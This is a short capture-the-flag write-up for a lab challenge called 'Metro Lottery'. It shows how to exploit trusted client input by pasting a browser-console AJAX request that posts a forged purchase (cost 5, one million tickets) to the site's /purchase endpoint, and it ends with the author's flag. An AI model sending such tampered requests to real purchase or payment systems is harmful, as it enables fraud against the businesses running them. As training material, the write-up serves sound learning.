### Metro Lottery
- The main challenge of involves exploiting trusted client input.
- You'll be tasked to win the lottery, which is not possible in the money allotted, you only have a 3.85% of finding the flag, you'll need at least an 80% chance
- The main issue with this website is that is allows you to adjust the values to purchase more tickets
Gym steps 
1. Load the website in your own browser
2. Right click > Inspect > Console 
3. Type in 
```
$.ajax({method : 'POST', url : '/purchase' + window.location.search, data : JSON.stringify({ cost : 5, tickets : 1000000, }), dataType : 'json', contentType : 'application/json' });
```
4. Click enter > You should see the page change under time remaining > Should say congratulations [Flag] 
- Flag is different for each user 
- My Flag: SKY-PVMQ-5713
